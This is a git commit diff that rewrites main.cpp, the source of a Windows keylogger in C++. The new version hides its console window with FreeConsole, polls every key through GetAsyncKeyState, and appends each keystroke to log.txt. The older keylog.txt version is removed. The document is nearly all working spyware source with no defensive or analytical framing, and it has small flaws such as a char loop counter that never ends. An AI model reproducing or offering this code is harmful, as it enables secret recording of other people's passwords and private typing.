28bfeaf62767d5b282248e0fedca2fae302802d3
can-er <47574594+can-er@users.noreply.github.com>
2019-11-10 21:07:33 +0100

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,85 +1,47 @@
-#include <stdio.h>
-#include <windows.h>
+#include <iostream>
+#include <Windows.h>
 
-#define FILENAME "keylog.txt"
+using namespace std;
 
-void CheckKey(int key);
+int Save(int _key, char *file);
 
-int main()
-{
-	while(1)
- 	{
- 		Sleep(300); // avoid 100% cpu usage
-		for(int key=8; key<=190; key++)
- 			if (GetAsyncKeyState(key) == HC_ACTION)
- 				CheckKey(key);
+int main() {
+ 	
+ 	FreeConsole();
+	char i;
+
+	while (true) 
+	{
+ 		Sleep(100);
+ 		for (i = 8; i <= 255; i++) {
+ 			if (GetAsyncKeyState(i) == -32767) {
+				Save(i, "log.txt");
+ 			}
+ 		}
  	}
  	return 0;
 }
 
-void CheckKey(int key)
-{
-	FILE *pfile = fopen(FILENAME,"a+");
-	{
-		if (key==8)
-	 		fprintf(pfile,"%s","[del]");
-		if (key==13)
-			fprintf(pfile,"%s","n");
-		if (key==32)
-			fprintf(pfile,"%s"," ");
-		if (key==VK_CAPITAL)
-			fprintf(pfile,"%s","[CAPS]");
-		if (key==VK_TAB)
-			fprintf(pfile,"%s","[TAB]");
-		if (key==VK_SHIFT)
-			fprintf(pfile,"%s","[SHIFT]");
-		if (key==VK_CONTROL)
-			fprintf(pfile,"%s","[CTRL]");
-		if (key==VK_PAUSE)
-			fprintf(pfile,"%s","[PAUSE]");
-		if (key==VK_ESCAPE)
-			fprintf(pfile,"%s","[ESC]");
-		if (key==VK_END)
-			fprintf(pfile,"%s","[END]");
-		if (key==VK_HOME)
-			fprintf(pfile,"%s","[HOME]");
-		if (key==VK_LEFT)
-			fprintf(pfile,"%s","[LEFT]");
-		if (key==VK_UP)
-			fprintf(pfile,"%s","[UP]");
-		if (key==VK_RIGHT)
-			fprintf(pfile,"%s","[RIGHT]");
-		if (key==VK_DOWN)
-			fprintf(pfile,"%s","[DOWN]");
-		if (key==VK_SNAPSHOT)
-			fprintf(pfile,"%s","[PRINT]");
-		if (key==VK_NUMLOCK)
-			fprintf(pfile,"%s","[NUM LOCK]");
-		if (key==190 || key==110)
-			fprintf(pfile,"%s",".");
-		/*
-		if (key >=96 && key <= 105)
-		{
-			key -= 48;
-			fprintf(pfile,"%s",&key);
-		}
-		if (key >=48 && key <= 59)
-			fprintf(pfile,"%s",&key);
-		if (key !=VK_LBUTTON || key !=VK_RBUTTON)
-		{
-			if (key >=65 && key <=90)
-		{
-		if (GetKeyState(VK_CAPITAL))
-		fprintf(pfile,"%s",&key);
-		else
-		{
-			key = key +32;
-			fprintf(pfile,"%s",&key);
 
-		}
-		*/
-	}
-		
-	fclose(pfile);
+int Save(int _key, char *file) {
 
- }
+	cout << _key << endl;
+	Sleep(100);
+	FILE *OUTPUT_FILE;
+	OUTPUT_FILE = fopen(file, "a+");
+
+	if (_key == VK_LSHIFT)
+		fprintf(OUTPUT_FILE, "%s", "MAJ+ ");
+	else if (_key == VK_RETURN)
+		fprintf(OUTPUT_FILE, "%s", "\n");
+	else if (_key == VK_ESCAPE)
+		fprintf(OUTPUT_FILE, "%s", "[ESC]");
+	else if (_key == VK_SPACE)
+		fprintf(OUTPUT_FILE, "%s", " ");
+	else
+		fprintf(OUTPUT_FILE, "%s", &_key);
+
+	fclose(OUTPUT_FILE);
+
+	return 0;
+}
